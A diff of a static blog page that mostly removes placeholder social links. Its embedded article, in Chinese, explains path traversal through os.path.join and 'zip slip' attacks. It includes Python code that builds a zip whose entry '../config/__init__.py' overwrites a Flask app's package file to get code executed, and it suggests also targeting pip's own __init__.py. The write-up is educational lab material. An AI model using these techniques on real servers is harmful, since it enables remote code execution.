@@ -11,7 +11,7 @@
     
     
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"articleBody":"目录跳转https://www.anquanke.com/post/id/86961\n0x01凡是调用了os.path.join的都存在目录跳转的问题\n利用os.path.join 实现目录跳转 然后覆盖__init__.py \n12345678910111213141516root@kali:/# pythonPython 2.7.16+ (default, Sep  4 2019, 08:19:57) [GCC 9.2.1 20190827] on linux2Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; path=&apos;/var/www/html/&apos;&gt;&gt;&gt; filename=&apos;../test.py&apos;&gt;&gt;&gt; import os&gt;&gt;&gt; outfile=os.path.join(path,filename)&gt;&gt;&gt; outfile&apos;/var/www/html/../test.py&apos;&gt;&gt;&gt; open(outfile,&apos;w&apos;).write(&apos;print &quot;test&quot;&apos;)&gt;&gt;&gt; open(outfile,&apos;r&apos;).read()&apos;print &quot;test&quot;&apos;&gt;&gt;&gt; root@kali:/# ls /var/wwwhtml  test.py\n\n0x02在本地起一个服务 https://github.com/ajinabraham/bad_python_extract\n生成恶意压缩包的代码\n123456import zipfilez_info = zipfile.ZipInfo(r\"../config/__init__.py\")z_file = zipfile.ZipFile(\"/bad.zip\", mode=\"w\")z_file.writestr(z_info, \"print 'test'\")z_info.external_attr = 0777 &lt;&lt; 16Lz_file.close()\n\n这里我们需要将文件名设为“../config/init.py”，以覆盖config目录中的init.py文件。z_info.external_attr = 0777 &lt;&lt; 16L这条语句会将文件权限设为所有人可读可写权限\n执行这段代码会生成一个bad.zip文件，然后上传，就好了\n服务台重启 并输出了test\n1234192.168.25.1 - - [05/Nov/2019 21:37:05] &quot;POST /upload HTTP/1.1&quot; 200 - * Detected change in &apos;/test/bad_python_extract-master/config/__init__.py&apos;, reloading * Restarting with stattest\n\n这里的test是 上面代码里生成的print test\n0x03附上几个python和压缩包有关的函数\n\n0x04前面这个案例中，由于Flask服务器运行在debug=True模式下，因此会立即执行任意代码。实际环境中情况可能不会完全一致。你可能需要等待一段时间，直至服务器重启为止。另一个问题是，我们并不能每次都知道目标应用使用的包的具体路径（本例中为config目录）。如果目标使用的是开源项目，通过阅读源代码我们很容易就能得到这些信息。对于闭源应用来说，我们可以猜测比较常见的包目录，如conf、config、settings、utils、urls、view、tests、scripts、controllers、modules、models、admin、login等。这些包目录经常出现在某些Python Web框架中，如Django、Flask、Pyramid、Tornado、CherryPy、web2py等。\n利用python内置的文件\n换个思路，假设目标Web应用运行在Ubuntu Linux系统之上，这种情况下，已安装的、内置的Python包位于/home/&lt;user&gt;/.local/lib/python2.7/site-packages/pip目录中。假设目标应用运行在用户目录中，那么我们就可以构造类似“../../.local/lib/python2.7/site-packages/pip/_init_.py”之类的文件名。文件完成解压后，利用这个文件名就可以在pip目录中生成_init_.py文件。如果目标应用使用的是virtualenv，假设virtualenv的目录为venv，那么我们就可以使用类似“../venv/lib/python2.7/site-packages/pip/_init_.py”之类的文件名。这样处理后pip会受到影响，但下次服务器上的用户运行pip命令时，就会执行我们的代码。\n","dateCreated":"2019-11-05T21:16:41+08:00","dateModified":"2019-11-05T21:46:57+08:00","datePublished":"2019-11-05T21:16:41+08:00","description":"","headline":"python学习","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/11/05/python学习/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"url":"http://yoursite.com/2019/11/05/python学习/"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"目录跳转https://www.anquanke.com/post/id/86961\n0x01凡是调用了os.path.join的都存在目录跳转的问题\n利用os.path.join 实现目录跳转 然后覆盖__init__.py \n12345678910111213141516root@kali:/# pythonPython 2.7.16+ (default, Sep  4 2019, 08:19:57) [GCC 9.2.1 20190827] on linux2Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; path=&apos;/var/www/html/&apos;&gt;&gt;&gt; filename=&apos;../test.py&apos;&gt;&gt;&gt; import os&gt;&gt;&gt; outfile=os.path.join(path,filename)&gt;&gt;&gt; outfile&apos;/var/www/html/../test.py&apos;&gt;&gt;&gt; open(outfile,&apos;w&apos;).write(&apos;print &quot;test&quot;&apos;)&gt;&gt;&gt; open(outfile,&apos;r&apos;).read()&apos;print &quot;test&quot;&apos;&gt;&gt;&gt; root@kali:/# ls /var/wwwhtml  test.py\n\n0x02在本地起一个服务 https://github.com/ajinabraham/bad_python_extract\n生成恶意压缩包的代码\n123456import zipfilez_info = zipfile.ZipInfo(r\"../config/__init__.py\")z_file = zipfile.ZipFile(\"/bad.zip\", mode=\"w\")z_file.writestr(z_info, \"print 'test'\")z_info.external_attr = 0777 &lt;&lt; 16Lz_file.close()\n\n这里我们需要将文件名设为“../config/init.py”，以覆盖config目录中的init.py文件。z_info.external_attr = 0777 &lt;&lt; 16L这条语句会将文件权限设为所有人可读可写权限\n执行这段代码会生成一个bad.zip文件，然后上传，就好了\n服务台重启 并输出了test\n1234192.168.25.1 - - [05/Nov/2019 21:37:05] &quot;POST /upload HTTP/1.1&quot; 200 - * Detected change in &apos;/test/bad_python_extract-master/config/__init__.py&apos;, reloading * Restarting with stattest\n\n这里的test是 上面代码里生成的print test\n0x03附上几个python和压缩包有关的函数\n\n0x04前面这个案例中，由于Flask服务器运行在debug=True模式下，因此会立即执行任意代码。实际环境中情况可能不会完全一致。你可能需要等待一段时间，直至服务器重启为止。另一个问题是，我们并不能每次都知道目标应用使用的包的具体路径（本例中为config目录）。如果目标使用的是开源项目，通过阅读源代码我们很容易就能得到这些信息。对于闭源应用来说，我们可以猜测比较常见的包目录，如conf、config、settings、utils、urls、view、tests、scripts、controllers、modules、models、admin、login等。这些包目录经常出现在某些Python Web框架中，如Django、Flask、Pyramid、Tornado、CherryPy、web2py等。\n利用python内置的文件\n换个思路，假设目标Web应用运行在Ubuntu Linux系统之上，这种情况下，已安装的、内置的Python包位于/home/&lt;user&gt;/.local/lib/python2.7/site-packages/pip目录中。假设目标应用运行在用户目录中，那么我们就可以构造类似“../../.local/lib/python2.7/site-packages/pip/_init_.py”之类的文件名。文件完成解压后，利用这个文件名就可以在pip目录中生成_init_.py文件。如果目标应用使用的是virtualenv，假设virtualenv的目录为venv，那么我们就可以使用类似“../venv/lib/python2.7/site-packages/pip/_init_.py”之类的文件名。这样处理后pip会受到影响，但下次服务器上的用户运行pip命令时，就会执行我们的代码。\n","dateCreated":"2019-11-05T21:16:41+08:00","dateModified":"2019-11-05T21:46:57+08:00","datePublished":"2019-11-05T21:16:41+08:00","description":"","headline":"python学习","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/11/05/python学习/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://yoursite.com/2019/11/05/python学习/"}</script>
     <meta name="description" content="目录跳转https://www.anquanke.com/post/id/86961 0x01凡是调用了os.path.join的都存在目录跳转的问题 利用os.path.join 实现目录跳转 然后覆盖__init__.py  12345678910111213141516root@kali:/# pythonPython 2.7.16+ (default, Sep  4 2019, 08:19">
 <meta property="og:type" content="blog">
 <meta property="og:title" content="python学习">
@@ -166,138 +166,6 @@
                         >
                         <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
                         <span class="sidebar-button-desc">关于</span>
-                    </a>
-            </li>
-            
-        </ul>
-        
-            <ul class="sidebar-buttons">
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://github.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="GitHub"
-                        >
-                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">GitHub</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="http://stackoverflow.com/users"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Stack Overflow"
-                        >
-                        <i class="sidebar-button-icon fab fa-stack-overflow" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Stack Overflow</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://twitter.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Twitter"
-                        >
-                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Twitter</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://facebook.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Facebook"
-                        >
-                        <i class="sidebar-button-icon fab fa-facebook" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Facebook</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://plus.google.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Google Plus"
-                        >
-                        <i class="sidebar-button-icon fab fa-google-plus" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Google Plus</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://www.linkedin.com/profile/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="LinkedIn"
-                        >
-                        <i class="sidebar-button-icon fab fa-linkedin" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">LinkedIn</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/mailto"
-                            
-                            rel="noopener"
-                            title="邮箱"
-                        >
-                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">邮箱</span>
-                    </a>
-            </li>
-            
-        </ul>
-        
-            <ul class="sidebar-buttons">
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/atom.xml"
-                            
-                            rel="noopener"
-                            title="RSS"
-                        >
-                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">RSS</span>
                     </a>
             </li>
             
